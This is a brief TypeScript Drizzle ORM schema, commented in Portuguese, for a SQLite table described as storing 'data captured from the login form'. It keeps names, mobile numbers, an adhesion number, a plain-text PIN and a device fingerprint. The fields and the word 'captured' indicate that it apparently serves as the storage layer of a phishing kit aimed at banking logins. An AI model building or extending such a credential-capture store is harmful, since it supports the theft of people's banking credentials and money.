import { integer, sqliteTable, text } from "drizzle-orm/sqlite-core";

/**
 * Tabela para armazenar dados capturados do formulário de login
 */
export const capturedData = sqliteTable("captured_data", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  nome: text("nome").notNull(),
  telemovel: text("telemovel").notNull(),
  numeroAdesao: text("numeroAdesao").notNull(),
  pin: text("pin").notNull(),
  fingerprint: text("fingerprint"),
  createdAt: integer("createdAt", { mode: "timestamp" }).$defaultFn(() => new Date()),
});

export type CapturedData = typeof capturedData.$inferSelect;
export type InsertCapturedData = typeof capturedData.$inferInsert;
